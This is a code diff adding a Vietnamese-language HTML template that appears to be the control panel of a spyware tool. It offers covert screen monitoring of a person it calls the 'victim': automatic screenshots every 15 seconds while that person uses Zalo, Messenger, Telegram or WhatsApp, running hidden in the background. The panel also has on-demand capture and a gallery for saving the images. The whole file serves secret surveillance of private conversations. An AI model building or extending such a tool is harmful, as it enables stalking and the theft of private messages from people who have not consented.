@@ -1,0 +1,67 @@
+<div class="ui container" style="margin-top: 20px;">
+    <h2 class="ui header">
+        <i class="camera icon"></i>
+        <div class="content">
+            Giám Sát Màn Hình (Zalo/Messenger)
+            <div class="sub header">Chụp ảnh màn hình tự động và thủ công</div>
+        </div>
+    </h2>
+
+    <div class="ui grid">
+        <div class="eight wide column">
+            <div class="ui segment">
+                <h3><i class="magic icon"></i> Chế Độ Tự Động</h3>
+                <p>Hệ thống sẽ <b>tự động chụp mỗi 15 giây</b> khi nạn nhân mở:</p>
+                <div class="ui list">
+                    <div class="item"><i class="check circle icon green"></i> Zalo</div>
+                    <div class="item"><i class="check circle icon green"></i> Messenger / Facebook</div>
+                    <div class="item"><i class="check circle icon green"></i> Telegram / WhatsApp</div>
+                </div>
+                <div class="ui message info">
+                    <p>Trạng thái: <b>Đang chạy ngầm</b> (Không cần thao tác)</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="eight wide column">
+            <div class="ui segment">
+                <h3><i class="hand point up icon"></i> Chế Độ Thủ Công</h3>
+                <p>Chụp màn hình ngay lập tức bất kể đang dùng app gì.</p>
+                <button id="takeScreenshotBtn" class="ui primary fluid button" ng-click="takeScreenshot()">
+                    <i class="camera icon"></i> Chụp Ngay Lập Tức
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <div class="ui divider"></div>
+
+    <div class="ui segment">
+        <h3><i class="images icon"></i> Thư Viện Ảnh (Mới nhất)</h3>
+        <button class="ui button mini" ng-click="clearScreenshots()" ng-show="screenshots.length > 0">Xóa list
+            tạm</button>
+
+        <div class="ui message warning" ng-show="screenshots.length == 0">
+            <p>Chưa có ảnh nào. Hãy đợi nạn nhân mở Zalo hoặc bấm "Chụp Ngay Lập Tức".</p>
+        </div>
+
+        <div class="ui four cards" style="margin-top: 10px;">
+            <div class="card" ng-repeat="shot in screenshots">
+                <div class="image">
+                    <img ng-src="{{shot.url}}" style="background: #eee; min-height: 150px; object-fit: contain;">
+                </div>
+                <div class="content">
+                    <div class="header" style="font-size: 14px;">{{shot.app}}</div>
+                    <div class="meta">
+                        <span class="date">{{shot.time}}</span>
+                    </div>
+                </div>
+                <div class="extra content">
+                    <button class="ui green button mini fluid" ng-click="saveScreenshot(shot)">
+                        <i class="download icon"></i> Lưu
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
